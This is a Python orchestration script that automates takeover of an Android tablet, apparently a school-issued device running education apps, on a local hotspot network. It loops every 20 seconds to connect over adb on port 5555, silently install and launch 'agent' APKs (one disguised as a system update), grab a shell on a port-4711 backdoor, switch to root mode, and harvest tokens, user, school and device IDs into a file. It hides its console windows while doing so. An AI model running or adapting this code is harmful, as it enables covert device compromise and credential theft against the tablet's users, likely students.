# -*- coding: utf-8 -*-
"""assist_orchestrator.py -- active orchestrator: makes the whole chain unattended/self-driving.

Loop (every 20s):
  1) read pentest/assist_result.log (assist-chain command output) -> extract privilege profile
     (uid / su present / adb state) and credentials (token / userId / schoolId / deviceId)
  2) auto-switch cmd_mode.txt based on the profile (uid=0 or su found -> root-adb; else keep combo)
  3) actively probe adb tcp 5555 -> on success grab shell, adb install agent APKs, launch agent
  4) actively probe 4711 (agent installed) -> grab shell
  5) dual-chain monitor: classroom.log + npcap_http80.log for REAL device hits
     (self-test traffic from 127.0.0.1 is filtered out: it has misled us before)
  6) write orchestrator.log / TAKEOVER-STATUS.txt / TOKEN-FOUND.txt / orchestrator_shell.txt

Usage: python assist_orchestrator.py [minutes, default 1440]
"""
import datetime
import os
import re
import socket
import subprocess
import sys
import time

# === PAD-AUTODETECT (patch_pad_ip.py): 按 MAC 找平板当前 IP, 免受 DHCP 换址影响 ===
_PAD_MAC = "80:20:fd:8b:4b:fa"
_pad_cache = {"ip": None, "t": 0.0}


def _p200_ip():
    import time as _t
    import subprocess as _sp
    import re as _re
    now = _t.time()
    if _pad_cache["ip"] and now - _pad_cache["t"] < 15:
        return _pad_cache["ip"]
    want = _PAD_MAC.replace(":", "-").lower()
    try:
        out = _sp.check_output(["arp", "-a"], creationflags=0x08000000).decode("utf-8", "replace")
        for line in out.splitlines():
            if want in line.lower():
                m = _re.search(r"(192\.168\.137\.\d+)", line)
                if m:
                    _pad_cache["ip"] = m.group(1)
                    _pad_cache["t"] = now
                    return m.group(1)
    except Exception:
        pass
    _pad_cache["ip"] = _pad_cache["ip"] or "192.168.137.154"
    _pad_cache["t"] = now
    return _pad_cache["ip"]
# === /PAD-AUTODETECT ===


BASE = os.path.dirname(os.path.abspath(__file__))
PAD = _p200_ip()
LOG = os.path.join(BASE, "orchestrator.log")
STATUS = os.path.join(BASE, "TAKEOVER-STATUS.txt")
TOKFILE = os.path.join(BASE, "TOKEN-FOUND.txt")
MODE_FILE = os.path.join(BASE, "cmd_mode.txt")
ASSIST_RESULT = os.path.join(BASE, "assist_result.log")
CLOUD_LOG = os.path.join(BASE, "cloud_api.log")
SHELL_OUT = os.path.join(BASE, "orchestrator_shell.txt")
CLASSROOM_LOG = os.path.join(BASE, "classroom.log")
HTTP80_LOG = os.path.join(BASE, "npcap_http80.log")

ADB_CANDIDATES = [
    r"C:\android-sdk\platform-tools\adb.exe",
    os.path.join(os.environ.get("LOCALAPPDATA", ""),
                 r"Microsoft\WinGet\Packages\Google.PlatformTools_Microsoft.Winget.Source_8wekyb3d8bbwe\platform-tools\adb.exe"),
]
ADB = next((p for p in ADB_CANDIDATES if os.path.exists(p)), ADB_CANDIDATES[0])

TOKEN_RE = re.compile(r'(?i)\b(access_?token|auth_?token|token|authorization)\b[^A-Za-z0-9]{0,4}([A-Za-z0-9\-._~+/=]{16,})')
UID_RE = re.compile(r'uid=(\d+)')
SU_RE = re.compile(r'/system/(x)?bin/su|/sbin/su|/su/bin/su')
ADB5555_RE = re.compile(r'service\.adb\.tcp\.port[^\n]*5555', re.I)

# dual-chain monitor signatures (only REAL device hits; 127.0.0.1 self-tests filtered)
CLASSROOM_SIGNS = ("[WS-OPEN]", "[WS-CLIENT]", "[HTTP-ON-WS-PORT]", "[FTP-7Z-SERVE]",
                   "[7Z-SERVE]", "[CWP-SERVE]", "[WS-RECV]", "[WS-PONG]")
HTTP80_SIGNS = ("[APK]", "[ASSIST]", "[ASSIST-TASKS]", "[ASSIST-RESULT]", "[MICRO]",
                "[SURVEY-JS]", "[TOKENLEAK]", "[BRIDGELEAK]", "[RELEASENOTE]")

minutes = int(sys.argv[1]) if len(sys.argv) > 1 else 1440
deadline = time.time() + minutes * 60
_seen_result = 0
_seen_token = set()
_dual_seen = {}
_state = {"adb_open": False, "shell": False, "agent": False, "mode": None, "classroom": False}


def ts():
    return datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")


def w(msg):
    line = "%s %s" % (ts(), msg)
    try:
        with open(LOG, "a", encoding="utf-8", errors="replace") as f:
            f.write(line + "\n")
    except OSError:
        pass
    print(line, flush=True)


def status(msg):
    try:
        with open(STATUS, "w", encoding="utf-8") as f:
            f.write("%s\n%s\n" % (ts(), msg))
    except OSError:
        pass


def read_lines(path, n=800):
    try:
        with open(path, encoding="utf-8", errors="replace") as f:
            return f.read().splitlines()[-n:]
    except Exception:
        return []


def set_mode(m):
    if _state["mode"] == m:
        return
    try:
        with open(MODE_FILE, "w") as f:
            f.write(m)
        _state["mode"] = m
        w("### [ORCH] cmd_mode -> %s" % m)
    except OSError as e:
        w("[ORCH] write cmd_mode failed: %s" % e)


def adb(*args, t=20):
    try:
        # NOFLASH (2026-10-10): 带 CREATE_NO_WINDOW, 避免 adb.exe 闪 CMD 窗口
        r = subprocess.run([ADB] + list(args), capture_output=True, text=True, timeout=t,
                           creationflags=0x08000000)
        return (r.stdout or "") + (r.stderr or "")
    except Exception as e:
        return "ERR:%s" % e


def port_open(ip, port, t=3):
    try:
        s = socket.create_connection((ip, port), timeout=t)
        s.close()
        return True
    except OSError:
        return False


def grab_4711():
    if not port_open(PAD, 4711):
        return False
    w("!!!!!! [ORCH] 4711 open -> grabbing shell")
    try:
        s = socket.create_connection((PAD, 4711), timeout=8)
        s.settimeout(6)
        out = ["banner: %r" % s.recv(4096)[:120]]
        for c in ("id", "getprop ro.product.model", "getprop ro.build.version.release", "ls /sdcard"):
            s.sendall((c + "\n").encode())
            time.sleep(1.0)
            out.append("$ %s -> %s" % (c, s.recv(16384).decode("utf-8", "replace").strip()[:400]))
        s.close()
        with open(SHELL_OUT, "a", encoding="utf-8") as f:
            f.write("\n".join(out) + "\n")
        _state["shell"] = True
        status("TAKEOVER: 4711 shell obtained\n" + "\n".join(out))
        return True
    except Exception as e:
        w("[ORCH] 4711 connect failed: %s" % e)
        return False


def try_adb():
    out = adb("connect", "%s:5555" % PAD, t=15)
    if "connected" not in out.lower() or "cannot" in out.lower() or "failed" in out.lower():
        return False
    if not _state["adb_open"]:
        w("!!!!!! [ORCH] adb 5555 connected: %s" % out.strip()[:120])
        _state["adb_open"] = True
    dev = "%s:5555" % PAD
    info = adb("-s", dev, "shell", "id; getprop ro.product.model; getprop ro.build.version.release", t=25)
    w("[ORCH] adb shell: %s" % info.replace("\n", " | ")[:300])
    with open(SHELL_OUT, "a", encoding="utf-8") as f:
        f.write("=== adb shell @%s ===\n%s\n" % (ts(), info))
    if not _state["agent"]:
        for apk in ("agent_wordstack.apk", "agent_acldtch.apk", "agent.apk"):
            p = os.path.join(BASE, apk)
            if not os.path.exists(p):
                continue
            r = adb("-s", dev, "install", "-r", p, t=180)
            w("[ORCH] adb install %s -> %s" % (apk, r.replace("\n", " ")[:200]))
            if "Success" in r:
                _state["agent"] = True
                status("TAKEOVER: adb installed %s" % apk)
                break
    if _state["agent"]:
        for pkg in ("com.xh.wordstackstu", "com.xh.acldtch", "com.zhitongyun.sysupdate"):
            adb("-s", dev, "shell", "am start -n %s/com.olive.agent.MainActivity" % pkg, t=30)
    return True


def scan_results():
    global _seen_result
    lines = read_lines(ASSIST_RESULT)
    if len(lines) <= _seen_result:
        return
    new = lines[_seen_result:]
    _seen_result = len(lines)
    blob = "\n".join(new)
    w("!!!!!! [ORCH] assist result +%d lines:\n%s" % (len(new), blob[:2500]))
    m = UID_RE.search(blob)
    if m:
        uid = int(m.group(1))
        w("[ORCH] privilege profile: uid=%d" % uid)
        if uid == 0:
            set_mode("root-adb")
            status("privilege: uid=0 (rooted)")
        else:
            status("privilege: uid=%d (non-root)" % uid)
    if SU_RE.search(blob):
        w("[ORCH] su binary found -> switch to root-adb")
        set_mode("root-adb")
    if ADB5555_RE.search(blob):
        w("[ORCH] reply shows service.adb.tcp.port=5555 -> try adb connect now")
        try_adb()
    for mm in TOKEN_RE.finditer(blob):
        v = mm.group(2)
        if v in _seen_token:
            continue
        _seen_token.add(v)
        w("!!!!!! [ORCH] credential candidate %s = %s" % (mm.group(1), v[:80]))
        with open(TOKFILE, "a", encoding="utf-8") as f:
            f.write("%s | %s = %s\n" % (ts(), mm.group(1), v))
        status("credential obtained: %s (see TOKEN-FOUND.txt)" % mm.group(1))
    for key in ("userId", "schoolId", "deviceId", "boundId"):
        for mm in re.finditer(r'(?i)%s["\s:=]+([A-Za-z0-9\-]{2,40})' % key, blob):
            w("[ORCH] %s = %s" % (key, mm.group(1)))


def scan_dual_chain():
    for path, signs, key in ((CLASSROOM_LOG, CLASSROOM_SIGNS, "classroom"),
                             (HTTP80_LOG, HTTP80_SIGNS, "http80")):
        n = _dual_seen.get(key, 0)
        lines = read_lines(path, 2000)
        if len(lines) <= n:
            continue
        new = lines[n:]
        _dual_seen[key] = len(lines)
        for ln in new:
            if not any(s in ln for s in signs):
                continue
            if "127.0.0.1" in ln or "::1" in ln or "192.168.137.1" in ln:
                continue  # skip self-tests (host loopback / our own IP)
            w("!!!!!! [ORCH-%s] %s" % (key.upper(), ln[:260]))
            if key == "classroom":
                _state["classroom"] = True
                status("[classroom] fired: %s" % ln[:160])
            if "[APK]" in ln:
                status("[APK] device download: %s" % ln[:160])
            if "[ASSIST-RESULT]" in ln:
                status("[assist] result: %s" % ln[:160])


def main():
    w("===== assist_orchestrator start: %d min, adb=%s =====" % (minutes, ADB))
    w("  watch: %s / %s / %s ; target %s" % (
        os.path.basename(ASSIST_RESULT), os.path.basename(CLASSROOM_LOG),
        os.path.basename(HTTP80_LOG), PAD))
    # baseline: only report NEW hits after startup (do not replay history)
    global _seen_result
    _seen_result = len(read_lines(ASSIST_RESULT))
    _dual_seen[ASSIST_RESULT] = 0
    for path, key in ((CLASSROOM_LOG, "classroom"), (HTTP80_LOG, "http80")):
        _dual_seen[key] = len(read_lines(path, 2000))
    w("  baseline: assist=%d, classroom=%d, http80=%d" % (
        _seen_result, _dual_seen.get("classroom", 0), _dual_seen.get("http80", 0)))
    while time.time() < deadline:
        try:
            scan_results()
            scan_dual_chain()
            if not _state["shell"]:
                grab_4711()
            if not _state["adb_open"] and not _state["shell"]:
                try_adb()
        except Exception as e:
            w("[ORCH-ERR] %s" % e)
        time.sleep(20)


if __name__ == "__main__":
    main()